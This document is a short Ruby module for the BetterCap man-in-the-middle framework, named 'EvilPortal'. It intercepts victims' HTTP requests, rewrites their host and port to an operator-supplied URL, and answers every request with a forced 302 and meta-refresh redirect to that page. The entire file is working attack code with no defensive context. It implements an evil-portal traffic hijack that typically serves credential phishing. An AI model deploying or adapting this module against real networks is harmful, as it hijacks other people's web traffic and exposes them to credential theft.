class EvilPortal < BetterCap::Proxy::HTTP::Module

    meta(
        'Name' => "EvilPortal - BetterCap::Proxy::HTTP::Module",
        'Description' => "",
        'Version' => "1.0",
        'Author' => "TW-D",
        'License' => ""
    )

    @@redirect_url = nil

    def self.on_options(options)
        options.on('--redirect-url URL', 'URL to redirect the target(s) to.') do |url|
            @@redirect_url = URI.parse(url)
        end
    end

    def initialize
        raise BetterCap::Error, "No --redirect-url option specified for the EvilPortal proxy module." if @@redirect_url.nil?
    end

    # Called before the request is performed.
    #
    def on_pre_request(request)
        BetterCap::Logger.error('[on_pre_request]')
        BetterCap::Logger.warn(request.inspect)
        request.port = @@redirect_url.port
        request['Host'] = @@redirect_url.host
    end

    # Called after the request is performed.
    #
    def on_request(request, response)
        BetterCap::Logger.error('[on_request]')
        BetterCap::Logger.warn(request.inspect)
        response.code = 302
        response.status = 'Found'
        response['Location'] = @@redirect_url
        response['Content-Type'] = 'text/html'
        response['Cache-Control'] = 'max-age=0, private, must-revalidate'
        response.body = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0; url=#{@@redirect_url}\"></head></html>"
        BetterCap::Logger.warn(response.inspect)
    end

end
